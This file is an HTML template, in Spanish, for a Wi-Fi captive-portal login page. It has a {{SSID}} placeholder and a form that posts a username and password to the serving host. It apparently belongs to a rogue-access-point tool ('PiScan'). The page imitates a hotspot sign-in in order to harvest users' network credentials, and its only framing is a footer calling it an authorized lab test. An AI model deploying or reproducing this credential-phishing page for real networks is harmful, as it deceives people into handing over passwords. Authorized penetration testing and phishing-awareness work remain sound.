<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{SSID}}</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;font-family:-apple-system,Segoe UI,Roboto,sans-serif;
    background:#f1f5f9;color:#111;display:flex;flex-direction:column}
  header{background:#0a7d4b;color:#fff;padding:18px 20px;display:flex;align-items:center;gap:12px}
  header .logo{width:34px;height:34px;border-radius:8px;background:#fff;color:#0a7d4b;
    font-weight:800;display:flex;align-items:center;justify-content:center;font-size:18px}
  header b{font-size:17px}
  main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{background:#fff;width:100%;max-width:400px;border:1px solid #e5e7eb;border-radius:14px;
    padding:24px;box-shadow:0 6px 24px rgba(0,0,0,.06)}
  h2{margin:0 0 4px;font-size:19px}
  .sub{margin:0 0 18px;color:#6b7280;font-size:13px}
  label{display:block;font-size:12px;color:#374151;margin:12px 0 6px;font-weight:600}
  input{width:100%;padding:13px 14px;font-size:16px;border:1.5px solid #d1d5db;border-radius:10px;outline:none}
  input:focus{border-color:#0a7d4b}
  button{width:100%;margin-top:20px;padding:14px;font-size:16px;font-weight:700;color:#fff;
    background:#0a7d4b;border:0;border-radius:10px;cursor:pointer}
  button:active{background:#076a40}
  .note{margin-top:14px;font-size:11px;color:#9ca3af;text-align:center}
  footer{padding:12px;text-align:center;font-size:11px;color:#9ca3af}
</style></head>
<body>
  <header><div class="logo">W</div><b>{{SSID}}</b></header>
  <main>
    <form class="box" method="POST" action="/">
      <h2>Acceso a Internet</h2>
      <p class="sub">Autentiquese para activar su sesion de navegacion.</p>
      <label for="u">Documento o usuario</label>
      <input id="u" name="usuario" type="text" autocomplete="off" placeholder="usuario">
      <label for="p">Contrase&ntilde;a</label>
      <input id="p" name="password" type="password" placeholder="contrase&ntilde;a">
      <button type="submit">Ingresar y navegar</button>
      <div class="note">Al ingresar acepta los terminos de uso de la red.</div>
    </form>
  </main>
  <footer>Red de laboratorio &middot; PiScan &middot; prueba autorizada</footer>
</body></html>
